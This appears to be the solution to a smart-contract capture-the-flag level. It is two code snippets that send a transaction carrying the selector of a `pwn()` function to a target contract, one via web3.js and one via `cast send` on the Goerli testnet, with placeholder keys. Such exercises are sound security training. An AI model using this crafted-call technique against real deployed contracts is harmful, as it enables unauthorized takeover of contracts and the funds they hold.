```js
// 0xdd365b8b is the selector of `pwn()` function, which is the first 4 bytes of keccak256("pwn()")
await web3.eth.sendTransaction({
  from: "0x59D3F24990098325aE80af90dc06E5AfF5E6356a",
  to: contract.address,
  data: "0xdd365b8b",
});
```

```bash
export GOERLI_RPC_URL=https://goerli.infura.io/v3/<apiKey>
cast send <contract> "pwn()" --rpc-url=$GOERLI_RPC_URL --private-key=<privateKey>
```
